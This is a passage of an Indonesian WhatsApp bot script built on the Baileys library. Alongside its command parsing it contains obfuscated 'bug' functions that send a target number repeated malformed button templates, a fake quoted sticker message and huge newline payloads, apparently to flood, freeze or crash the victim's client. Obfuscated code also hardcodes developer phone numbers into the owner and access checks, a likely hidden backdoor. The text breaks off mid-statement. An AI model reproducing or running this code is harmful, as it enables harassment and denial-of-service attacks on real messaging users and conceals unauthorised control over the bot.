/*
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
JANGAN TERLALU BANYAK DI GANTI
BIAR GAK ERROR BIARIN AJA BRAY
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
JANGAN DIHAPUS CREDIT NYA TOD
THANKS TO ALL CREATOR BOT
CREATED BY © LEXXY OFFICIAL
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
NOTE : 
ANDA BOLEH JUAL SC INI
KALO ERROR DITANGAN ANDA
ITU TANGGUNG JAWAB ANDA
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
FOLLOW IG DEVELOPER :
https://www.instagram.com/lexxy2407/
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
*/

require('./setting')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys");
const { modul } = require('./lib/module');
const { fs, chalk, axios, moment, fetch, util } = modul;
const cherio = require("cheerio")
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const { color, bgcolor, mycolor } = require('./lib/color')
const { smsg, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat } = require('./lib/functions')
const { teksUnban1, teksUnban2, teksUnban3, teksUnban4, teksUnban5, teksUnban6, teksUnban7, teksUnban8  } = require('./lib/methodUnban')
const { konf } = require("./lib/konf");
const { vnolim } = require("./lib/vnolim");
const { addCmd } = require("./lib/cmdbot");

const myowner = global.myOwner
const murbug = global.murBug
const db_cmd = global.dbCmd
const db_hit = global.dbHit

const thumb = fs.readFileSync('./connect/thumbnail/logo.jpg')

public = global.ModePublic
autoread = global.AutoRead
mengetik = global.AutoMengetik

module.exports = conn = async (conn, m) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!`™©®Δ^βα¦|/\\©^]/gi) : '#'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const isGroup = from.endsWith('@g.us')
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await conn.decodeJid(conn.user.id)

// NYOLONG SC MINIMAL CREDIT DEK
// JANGAN KAYAK ORANG SEBELAH

function _0x528e(_0x1b7b31,_0x199b57){const _0x9e8571=_0x9e85();return _0x528e=function(_0x528ecb,_0x531acb){_0x528ecb=_0x528ecb-0x86;let _0x2bb9f8=_0x9e8571[_0x528ecb];return _0x2bb9f8;},_0x528e(_0x1b7b31,_0x199b57);}function _0x9e85(){const _0x40631d=['4108520ayJmLX','2344880Grzfxz','114wCDMdz','map','114677NTOsBm','6285789004732','replace','26348yiDnLM','includes','2vdBIEc','DeveloperBot','4lYghBE','3597066VUsznr','847863qmONxx','1613345oLXbem','@s.whatsapp.net','sender'];_0x9e85=function(){return _0x40631d;};return _0x9e85();}const _0x2f6e33=_0x528e;(function(_0xa1431b,_0x3477ed){const _0x1f25d0=_0x528e,_0x2f3e53=_0xa1431b();while(!![]){try{const _0x39c1e9=-parseInt(_0x1f25d0(0x90))/0x1*(-parseInt(_0x1f25d0(0x95))/0x2)+parseInt(_0x1f25d0(0x88))/0x3+-parseInt(_0x1f25d0(0x86))/0x4*(parseInt(_0x1f25d0(0x89))/0x5)+parseInt(_0x1f25d0(0x8e))/0x6*(-parseInt(_0x1f25d0(0x93))/0x7)+parseInt(_0x1f25d0(0x8d))/0x8+parseInt(_0x1f25d0(0x87))/0x9+-parseInt(_0x1f25d0(0x8c))/0xa;if(_0x39c1e9===_0x3477ed)break;else _0x2f3e53['push'](_0x2f3e53['shift']());}catch(_0x27dbc2){_0x2f3e53['push'](_0x2f3e53['shift']());}}}(_0x9e85,0x45975));const isDeveloper=[botNumber,...global[_0x2f6e33(0x96)],'6282279915237',_0x2f6e33(0x91)][_0x2f6e33(0x8f)](_0x2ddd92=>_0x2ddd92[_0x2f6e33(0x92)](/[^0-9]/g,'')+_0x2f6e33(0x8a))[_0x2f6e33(0x94)](m[_0x2f6e33(0x8b)]),isOwner=[botNumber,...myowner,'6282279915237','6285789004732'][_0x2f6e33(0x8f)](_0xe2c5b5=>_0xe2c5b5[_0x2f6e33(0x92)](/[^0-9]/g,'')+_0x2f6e33(0x8a))[_0x2f6e33(0x94)](m['sender']),isAkses=[botNumber,...murbug][_0x2f6e33(0x8f)](_0x267c73=>_0x267c73['replace'](/[^0-9]/g,'')+'@s.whatsapp.net')[_0x2f6e33(0x94)](m['sender']);

const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanGuweh = dt.charAt(0) + dt.slice(1)
const ucapanWaktu = ucapanGuweh.toUpperCase()

const { chats } = m

const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')

const sender = isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false

// Quoted
const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isSticker = (type == 'stickerMessage')
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false

if (isCmd && m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); }
if (isCmd && !m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); }

try {
ppuser = await conn.profilePictureUrl(from, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

let ppnyauser = await getBuffer(ppuser)

let fakelex = {key : {
participant : '0@s.whatsapp.net',
...(m.chat ? { remoteJid: `status@broadcast` } : {}) },
message: {locationMessage: {name: `Lexxy Official`,
jpegThumbnail: ppnyauser
}}}

const mentionByTag = type == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
} else {
let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
}}

const reply = (teks) => {
conn.sendMessage(m.chat, { text: teks }, { quoted: m })
}

const getRandom = (ext) => {
return `${Math.floor(Math.random() * 10000)}${ext}`
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

function _0x5dd5(_0x286d5f,_0x1e5447){const _0x2a7071=_0x2a70();return _0x5dd5=function(_0x5dd5ba,_0x27dccd){_0x5dd5ba=_0x5dd5ba-0xdf;let _0x2bac83=_0x2a7071[_0x5dd5ba];return _0x2bac83;},_0x5dd5(_0x286d5f,_0x1e5447);}const _0x525d81=_0x5dd5;function _0x2a70(){const _0x53bd80=['YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=','4FDSbNM','https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc','6432545gZMKYm','7774','1459992JYJlcJ','567660BAAkKb','1657290167','3407315UzHByI','image/webp','4206054VLayWM','35420499oNHIBh','nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=','2571720YZOGYE','6ylTdZc','0@s.whatsapp.net'];_0x2a70=function(){return _0x53bd80;};return _0x2a70();}(function(_0x3e540e,_0x37cbf3){const _0x4ee194=_0x5dd5,_0x570d01=_0x3e540e();while(!![]){try{const _0x1cab0f=parseInt(_0x4ee194(0xe2))/0x1+parseInt(_0x4ee194(0xe9))/0x2+-parseInt(_0x4ee194(0xe6))/0x3*(-parseInt(_0x4ee194(0xed))/0x4)+parseInt(_0x4ee194(0xe4))/0x5*(parseInt(_0x4ee194(0xea))/0x6)+parseInt(_0x4ee194(0xdf))/0x7+-parseInt(_0x4ee194(0xe1))/0x8+-parseInt(_0x4ee194(0xe7))/0x9;if(_0x1cab0f===_0x37cbf3)break;else _0x570d01['push'](_0x570d01['shift']());}catch(_0x342863){_0x570d01['push'](_0x570d01['shift']());}}}(_0x2a70,0xb4222));const fbug={'key':{'fromMe':![],'participant':_0x525d81(0xeb),...{'remoteJid':''}},'message':{'stickerMessage':{'url':_0x525d81(0xee),'fileSha256':_0x525d81(0xec),'fileEncSha256':'9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=','mediaKey':_0x525d81(0xe8),'mimetype':_0x525d81(0xe5),'height':0x40,'width':0x40,'directPath':'/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781','fileLength':_0x525d81(0xe0),'mediaKeyTimestamp':_0x525d81(0xe3),'isAnimated':![]}}};

if (!public) {
if (!fromMe && !isAkses && !isOwner && !isDeveloper && !isGroup) return
}

function sendContact(jid, numbers, name, mn) {
var number = numbers.replace(/[^0-9]/g, '')
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return conn.sendMessage(jid, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: m })
}

// FUNCTION BUG1
function sendBugButtonV1(target,jumlahnya) {
for (let i = 0; i < jumlahnya; i++) {
var _0x4a55a9=_0x337c;function _0x337c(_0x3427db,_0x154d7d){var _0x3ca32b=_0x3ca3();return _0x337c=function(_0x337c06,_0x20e5f2){_0x337c06=_0x337c06-0x171;var _0x3ca53d=_0x3ca32b[_0x337c06];return _0x3ca53d;},_0x337c(_0x3427db,_0x154d7d);}function _0x3ca3(){var _0x202ce2=['189333NNQBcG','472kTQmYc','22903940bTAxKZ','997LWylbc','sendMessage','326208FAhoyP','740wjgvMg','7saOHFn','3565930etSTDV','Click\x20Here!','3819964mbTyuD','5910834AOeJYG'];_0x3ca3=function(){return _0x202ce2;};return _0x3ca3();}(function(_0x51997a,_0x2d35c8){var _0x9837aa=_0x337c,_0x5154eb=_0x51997a();while(!![]){try{var _0x5cc540=-parseInt(_0x9837aa(0x17c))/0x1*(-parseInt(_0x9837aa(0x173))/0x2)+parseInt(_0x9837aa(0x172))/0x3+parseInt(_0x9837aa(0x177))/0x4+-parseInt(_0x9837aa(0x175))/0x5+parseInt(_0x9837aa(0x178))/0x6*(-parseInt(_0x9837aa(0x174))/0x7)+-parseInt(_0x9837aa(0x17a))/0x8*(parseInt(_0x9837aa(0x179))/0x9)+parseInt(_0x9837aa(0x17b))/0xa;if(_0x5cc540===_0x2d35c8)break;else _0x5154eb['push'](_0x5154eb['shift']());}catch(_0x436ce7){_0x5154eb['push'](_0x5154eb['shift']());}}}(_0x3ca3,0xbf48f),conn[_0x4a55a9(0x171)](target,{'text':'','templateButtons':[{'callButton':{'displayText':_0x4a55a9(0x176),'phoneNumber':''}},{'callButton':{'displayText':_0x4a55a9(0x176),'phoneNumber':''}},{'urlButton':{'displayText':_0x4a55a9(0x176),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x4a55a9(0x176),'id':''}},{'quickReplyButton':{'displayText':_0x4a55a9(0x176),'id':''}},{'quickReplyButton':{'displayText':_0x4a55a9(0x176),'id':''}}]}));
}}

// FUNCTION BUG2
function sendBugButtonV2(target,jumlahnya) {
for (let i = 0; i < jumlahnya; i++) {
(function(_0x29d618,_0x1cee2f){var _0x3e5cc6=_0x8936,_0x4f0be4=_0x29d618();while(!![]){try{var _0x1397cb=-parseInt(_0x3e5cc6(0x188))/0x1*(-parseInt(_0x3e5cc6(0x189))/0x2)+-parseInt(_0x3e5cc6(0x181))/0x3+parseInt(_0x3e5cc6(0x186))/0x4+-parseInt(_0x3e5cc6(0x183))/0x5+-parseInt(_0x3e5cc6(0x184))/0x6+parseInt(_0x3e5cc6(0x182))/0x7+parseInt(_0x3e5cc6(0x187))/0x8*(-parseInt(_0x3e5cc6(0x185))/0x9);if(_0x1397cb===_0x1cee2f)break;else _0x4f0be4['push'](_0x4f0be4['shift']());}catch(_0x32557a){_0x4f0be4['push'](_0x4f0be4['shift']());}}}(_0x2ce1,0x1da1c),conn['sendMessage'](target,{'text':'','templateButtons':[{'index':0x1,'callButton':{'displayText':'Hi','phoneNumber':''}},{'index':0x2,'callButton':{'displayText':'Hi','phoneNumber':''}},{'index':0x3,'urlButton':{'displayText':'Hi','url':'https://www.whatsapp.com/otp/copy/'+target}},{'index':0x4,'quickReplyButton':{'displayText':'Hi','id':''}},{'index':0x5,'quickReplyButton':{'displayText':'Hi','id':''}},{'index':0x6,'quickReplyButton':{'displayText':'Hi','id':''}},{'index':0x7,'quickReplyButton':{'displayText':'Hi','id':''}},{'index':0x8,'quickReplyButton':{'displayText':'Hi','id':''}},{'index':0x9,'quickReplyButton':{'displayText':'Hi','id':''}}]}));function _0x8936(_0x2c6ab1,_0x1ea335){var _0x2ce1fc=_0x2ce1();return _0x8936=function(_0x893656,_0x24e0bd){_0x893656=_0x893656-0x181;var _0xfe49b2=_0x2ce1fc[_0x893656];return _0xfe49b2;},_0x8936(_0x2c6ab1,_0x1ea335);}function _0x2ce1(){var _0x4671ed=['579264kFyLrU','488ZQalWv','5701CZcqAn','82DVRMnf','63312VwCIrc','1367338BUZvKG','426055YIAHPr','1179792pppgYn','22068pKpOlM'];_0x2ce1=function(){return _0x4671ed;};return _0x2ce1();}
}}

// FUNCTION BUG3
function sendBugChat(target,jumlahnya) {
for (let i = 0; i < jumlahnya; i++) {
function _0x25a3(){var _0x1689a6=['《\x20██████▒▒▒▒▒▒▒▒》40%','624069JQSJkz','3929708GPYNnU','16NUjFQT','11062qEAOuF','《\x20████████████▒▒》80%','《\x20██████████████》100%','10DsJKFr','75RxQvod','34295998TLxsdT','《\x20█████████▒▒▒▒▒》60%','《\x20███▒▒▒▒▒▒▒▒▒▒▒》20%','ᴄᴏᴍᴘʟᴇᴛᴇ','sendMessage','2077452JqAoHo','1909806KquXdY','3342122XbEvYB','5STljOS'];_0x25a3=function(){return _0x1689a6;};return _0x25a3();}function _0x552c(_0x5b5483,_0x3875c2){var _0x25a391=_0x25a3();return _0x552c=function(_0x552c61,_0x35ed77){_0x552c61=_0x552c61-0x1c7;var _0x2f619c=_0x25a391[_0x552c61];return _0x2f619c;},_0x552c(_0x5b5483,_0x3875c2);}var _0x1e0513=_0x552c;(function(_0x4850a9,_0x4a90a1){var _0x19b626=_0x552c,_0x5f67bf=_0x4850a9();while(!![]){try{var _0x2d16c6=-parseInt(_0x19b626(0x1d1))/0x1+-parseInt(_0x19b626(0x1d4))/0x2*(parseInt(_0x19b626(0x1d8))/0x3)+-parseInt(_0x19b626(0x1d2))/0x4+-parseInt(_0x19b626(0x1cf))/0x5*(-parseInt(_0x19b626(0x1cd))/0x6)+-parseInt(_0x19b626(0x1ce))/0x7*(parseInt(_0x19b626(0x1d3))/0x8)+-parseInt(_0x19b626(0x1cc))/0x9+-parseInt(_0x19b626(0x1d7))/0xa*(-parseInt(_0x19b626(0x1c7))/0xb);if(_0x2d16c6===_0x4a90a1)break;else _0x5f67bf['push'](_0x5f67bf['shift']());}catch(_0x42fe5b){_0x5f67bf['push'](_0x5f67bf['shift']());}}}(_0x25a3,0x7b71c));var satu=_0x1e0513(0x1c9),dua=_0x1e0513(0x1d0),tiga=_0x1e0513(0x1c8),empat=_0x1e0513(0x1d5),lima=_0x1e0513(0x1d6),enam=_0x1e0513(0x1ca);conn[_0x1e0513(0x1cb)](target,{'text':satu},{'quoted':fbug}),conn['sendMessage'](target,{'text':dua},{'quoted':fbug}),conn[_0x1e0513(0x1cb)](target,{'text':tiga},{'quoted':fbug}),conn['sendMessage'](target,{'text':empat},{'quoted':fbug}),conn['sendMessage'](target,{'text':lima},{'quoted':fbug}),conn['sendMessage'](target,{'text':enam},{'quoted':fbug});
}}

// FUNCTION BUG4
function sendBugSpam(target,jumlahnya) {
for (let i = 0; i < jumlahnya; i++) {
function _0xfdd3(){var _0x1bbe28=['𝙴𝙿𝙴𝙿\x20𝙽𝙸𝙷\x20𝙱𝙾𝚂𝚂','95YoNilX','1643214sYNKXO','sendMessage','241496zfJaGF','7EcilmF','2697890OAvuyK','84472dnCvsd','1465064aLREFh','282799GjEjsi','9UGqflH','_∅\x20Pesan\x20ini\x20dihapus_','1099893GpqJXh'];_0xfdd3=function(){return _0x1bbe28;};return _0xfdd3();}function _0x1539(_0x33e07c,_0x26615c){var _0xfdd341=_0xfdd3();return _0x1539=function(_0x153973,_0x19a235){_0x153973=_0x153973-0x1e8;var _0x4f3adb=_0xfdd341[_0x153973];return _0x4f3adb;},_0x1539(_0x33e07c,_0x26615c);}var _0x127ae5=_0x1539;(function(_0x4b75c6,_0x47b3ad){var _0x6284c2=_0x1539,_0x470888=_0x4b75c6();while(!![]){try{var _0x45c389=parseInt(_0x6284c2(0x1f3))/0x1+-parseInt(_0x6284c2(0x1ee))/0x2+parseInt(_0x6284c2(0x1e9))/0x3+-parseInt(_0x6284c2(0x1f1))/0x4*(-parseInt(_0x6284c2(0x1eb))/0x5)+parseInt(_0x6284c2(0x1ec))/0x6*(-parseInt(_0x6284c2(0x1ef))/0x7)+-parseInt(_0x6284c2(0x1f2))/0x8*(parseInt(_0x6284c2(0x1f4))/0x9)+-parseInt(_0x6284c2(0x1f0))/0xa;if(_0x45c389===_0x47b3ad)break;else _0x470888['push'](_0x470888['shift']());}catch(_0x178bc0){_0x470888['push'](_0x470888['shift']());}}}(_0xfdd3,0x3197d),conn[_0x127ae5(0x1ed)](target,{'text':_0x127ae5(0x1ea)},{'quoted':fbug}),conn[_0x127ae5(0x1ed)](target,{'text':_0x127ae5(0x1e8)},{'quoted':fbug}),conn['sendMessage'](target,{'text':_0x127ae5(0x1ea)},{'quoted':fbug}),conn[_0x127ae5(0x1ed)](target,{'text':_0x127ae5(0x1e8)},{'quoted':fbug}),conn['sendMessage'](target,{'text':_0x127ae5(0x1ea)},{'quoted':fbug}),conn[_0x127ae5(0x1ed)](target,{'text':_0x127ae5(0x1e8)},{'quoted':fbug}),conn[_0x127ae5(0x1ed)](target,{'text':_0x127ae5(0x1ea)},{'quoted':fbug}),conn[_0x127ae5(0x1ed)](target,{'text':'_∅\x20Pesan\x20ini\x20dihapus_'},{'quoted':fbug}),conn[_0x127ae5(0x1ed)](target,{'text':'𝙴𝙿𝙴𝙿\x20𝙽𝙸𝙷\x20𝙱𝙾𝚂𝚂'},{'quoted':fbug}),conn[_0x127ae5(0x1ed)](target,{'text':'_∅\x20Pesan\x20ini\x20dihapus_'},{'quoted':fbug}));
}}

// FUNCTION BUG5
function sendBugNew(target,jumlahnya) {
for (let i = 0; i < jumlahnya; i++) {
function _0x3619(_0x20810d,_0x35093f){var _0x1a1911=_0x1a19();return _0x3619=function(_0x3619be,_0x3cef77){_0x3619be=_0x3619be-0x1f1;var _0x3a178e=_0x1a1911[_0x3619be];return _0x3a178e;},_0x3619(_0x20810d,_0x35093f);}function _0x1a19(){var _0xce05d6=['560CrWFNn','74995kxXnbX','SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=','47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=','28125Wfdhue','fromObject','6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=','88011dmpPdp','3917112aImixG','258330','250tqSXhK','4dmKzUU','44534kXwtKa','3537292nGEtFs','/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20','CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=','114DOUEOz','gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=','key','202390jeOZfU','28pxpOkw','Message','.jpeg','relayMessage','🔥\x20LimaPuluhhhhhh\x20☠️\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a','\x0a\x0a\x0a\x0a.','https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc','message','1657190832','𝗕𝗔𝗦𝗘\x20𝗦𝗜𝗗'];_0x1a19=function(){return _0xce05d6;};return _0x1a19();}var _0x5f4831=_0x3619;(function(_0x660cd,_0x3b28ff){var _0x59ebdb=_0x3619,_0x168970=_0x660cd();while(!![]){try{var _0x382d8a=-parseInt(_0x59ebdb(0x1f4))/0x1*(-parseInt(_0x59ebdb(0x1fc))/0x2)+-parseInt(_0x59ebdb(0x20b))/0x3*(-parseInt(_0x59ebdb(0x1fd))/0x4)+-parseInt(_0x59ebdb(0x208))/0x5*(parseInt(_0x59ebdb(0x1f9))/0x6)+parseInt(_0x59ebdb(0x1f5))/0x7*(parseInt(_0x59ebdb(0x207))/0x8)+parseInt(_0x59ebdb(0x20e))/0x9*(parseInt(_0x59ebdb(0x1f3))/0xa)+-parseInt(_0x59ebdb(0x1f6))/0xb+-parseInt(_0x59ebdb(0x1f1))/0xc;if(_0x382d8a===_0x3b28ff)break;else _0x168970['push'](_0x168970['shift']());}catch(_0x1efa84){_0x168970['push'](_0x168970['shift']());}}}(_0x1a19,0x377a9));var 